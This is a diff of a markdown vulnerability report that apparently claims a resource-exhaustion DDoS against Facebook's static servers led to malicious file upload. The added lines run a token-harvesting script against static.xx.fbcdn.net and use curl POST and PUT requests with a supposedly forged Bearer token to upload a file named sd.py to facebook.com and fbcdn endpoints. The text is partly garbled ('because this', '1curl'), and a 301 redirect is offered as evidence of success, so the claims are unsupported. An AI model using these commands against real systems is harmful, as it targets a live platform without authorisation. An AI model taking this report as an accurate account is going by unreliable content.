@@ -61,17 +61,18 @@ The script provided is a practical demonstration of how DDoS attacks through res
 ![status 200s](https://raw.githubusercontent.com/DeadmanXXXII/Face/main/Screenshot_20240902-182457.png)
 
 
-Certainly. Here’s the updated report with the added CWE for weak and predictable tokens:
 
-### Report Title: Face a DDoS through Resource Exhaustion Leading to Malicious File Upload
 
----
+
+
+# Report Title: Face a DDoS through Resource Exhaustion Leading to Malicious File Upload
+
+
 
 #### **Summary**
 
 This report documents the discovery and exploitation of a resource exhaustion vulnerability that led to a malicious file upload. The vulnerability was identified through a series of distributed denial-of-service (DDoS) attacks which eventually revealed a weakness in file upload handling. This led to the crafting of an exploit to upload arbitrary files using forged authentication tokens.
 
----
 
 #### **Vulnerability Description**
 
@@ -84,7 +85,26 @@ The vulnerability was uncovered by conducting a resource exhaustion attack throu
 **Final Exploitation**:
 - Using a forged authentication token obtained from `Cookie_Monster.py`, file uploads were successfully performed via both `POST` and `PUT` methods.
 
----
+```bash
+python3 Cookie_Monster.py https://static.xx.fbcdn.net/rsrc.php/
+```
+Auth token found:
+QrThZm6BcPBXW3JZdkTN_jWo
+
+```bash
+curl -X POST -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://facebook.com/rsrc.php/v3 -v
+```
+```bash
+curl -X PUT -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://facebook.com/rsrc.php/v3 -v
+```
+The reason this is the command is because this.
+```bash
+1curl -X PUT -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://static.xx.fbcdn.net/rsrc.php
+```
+```bash
+curl -X POST -T sd.py -H "Authorization: Bearer QrThZm6BcPBXW3JZdkTN_jWo" https://static.xx.fbcdn.net/rsrc.php
+```
+Gives a 301 redirect to this https://facebook.com/rsrc.php and /v3 
 
 #### **Impact**
 
